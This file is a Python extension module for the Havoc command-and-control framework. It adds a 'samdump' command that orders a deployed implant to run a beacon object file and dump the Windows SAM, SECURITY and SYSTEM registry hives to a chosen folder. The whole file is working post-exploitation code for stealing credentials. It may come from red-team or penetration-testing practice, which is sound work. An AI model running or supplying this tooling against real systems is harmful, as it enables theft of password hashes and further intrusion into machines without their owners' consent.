from havoc import Demon, RegisterCommand
from struct import pack, calcsize
import re
import time

# https://github.com/EncodeGroup/BOF-RegSave/tree/master

def is_full_path(path):
    return re.match(r'^[a-zA-Z]:\\', path) is not None

class SamDumpPacker:
    def __init__(self):
        self.buffer : bytes = b''
        self.size   : int   = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addstr(self, s):
        if isinstance(s, str):
            s = s.encode("utf-8" )
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s)+1, s)
        self.size += calcsize(fmt)

    def addbytes(self, b):
        fmt = "<L{}s".format(len(b))
        self.buffer += pack(fmt, len(b), b)
        self.size += calcsize(fmt)

    def addbool(self, b):
        fmt = '<I'
        self.buffer += pack(fmt, 1 if b else 0)
        self.size += calcsize(fmt)

    def adduint32(self, n):
        fmt = '<I'
        self.buffer += pack(fmt, n)
        self.size += calcsize(fmt)

def samdump(demonID, *params):
    TaskID : str    = None
    demon  : Demon  = None
    packer = SamDumpPacker()

    num_params = len(params)
    path = ''

    demon = Demon( demonID )

    if num_params != 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing the path" )
        return True

    path = params[ 0 ]

    packer.addstr(path)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to dump the SAM registry" )

    demon.InlineExecute( TaskID, "go", f"regdump.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

RegisterCommand( samdump, "", "samdump", "Dump the SAM, SECURITY and SYSTEM registries", 0, "<folder>", "C:\\Windows\\Temp\\" )
